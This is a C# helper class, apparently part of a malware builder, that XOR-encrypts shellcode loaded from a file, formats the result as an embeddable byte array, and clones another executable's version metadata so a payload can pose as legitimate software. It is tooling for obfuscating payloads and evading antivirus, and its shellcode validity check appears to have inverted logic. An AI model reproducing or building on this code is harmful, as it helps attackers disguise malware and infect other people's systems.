using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace Builder.Core
{
    class Helper
    {
        #region Forms & Algorithm Helper
        private static readonly Random random = new Random();

        public static string GenerateHexArray(byte[] data)
        {
            return "new byte[] { " + string.Join(", ", data.Select(b => "0x" + b.ToString("X2"))) + " };";
        }
        public static byte[] GenerateRandomBytes(int length)
        {
            byte[] bytes = new byte[length];
            random.NextBytes(bytes);
            return bytes;
        }

        public static string GenerateStrBytes(int length)
        {
            byte[] bytes = new byte[length];
            random.NextBytes(bytes);

            return BitConverter.ToString(bytes).Replace("-", " ");
        }
        #endregion

        #region Assembly Changer
        public static string AssemblyClone(string sourceFilePath, string targetFilePath)
        {
            var fileVersionInfo = FileVersionInfo.GetVersionInfo(sourceFilePath);

            string versionInfoText = $"{fileVersionInfo.InternalName ?? "N/A"}\n" +
                                     $"{fileVersionInfo.FileDescription ?? "N/A"}\n" +
                                     $"{fileVersionInfo.CompanyName ?? "N/A"}\n" +
                                     $"{fileVersionInfo.ProductName ?? "N/A"}\n" +
                                     $"{fileVersionInfo.LegalCopyright ?? "N/A"}\n" +
                                     $"{fileVersionInfo.LegalTrademarks ?? "N/A"}\n" +
                                     $"{fileVersionInfo.FileMajorPart}.{fileVersionInfo.FileMinorPart}.{fileVersionInfo.FileBuildPart}.{fileVersionInfo.FilePrivatePart}\n" +
                                     $"{fileVersionInfo.ProductMajorPart}.{fileVersionInfo.ProductMinorPart}.{fileVersionInfo.ProductBuildPart}.{fileVersionInfo.ProductPrivatePart}";

            try
            {
                File.WriteAllText(targetFilePath, versionInfoText);
                return targetFilePath;
            }
            catch
            {
                return null;
            }
        }
        #endregion

        #region Encryption Algorithms
        public static byte[] EncryptShellcodeFromFile(string inputFile, byte[] key)
        {
            string shellcodeText = File.ReadAllText(inputFile);

            byte[] shellcode = ConvertStringToByteArray(shellcodeText);

            return EncryptShellcode(shellcode, key);
        }

        public static bool IsCorrectShellcode(string inputFile)
        {
            string payloadBytes = File.ReadAllText(inputFile);
            string pattern = @"\b0x[0-9A-Fa-f]{2}\b";
            return !Regex.IsMatch(payloadBytes, pattern) ? true : false;
        }

        private static byte[] EncryptShellcode(byte[] shellcode, byte[] key)
        {
            byte[] eBytes = new byte[shellcode.Length];

            for (int i = 0; i < shellcode.Length; i++)
            {
                eBytes[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
            }

            return eBytes;
        }
        private static byte[] ConvertStringToByteArray(string input)
        {
            MatchCollection matches = Regex.Matches(input, @"0x[0-9A-Fa-f]{2}");

            byte[] byteArray = new byte[matches.Count];
            for (int i = 0; i < matches.Count; i++)
            {
                byteArray[i] = Convert.ToByte(matches[i].Value, 16);
            }

            return byteArray;
        }

        #endregion
    }
}
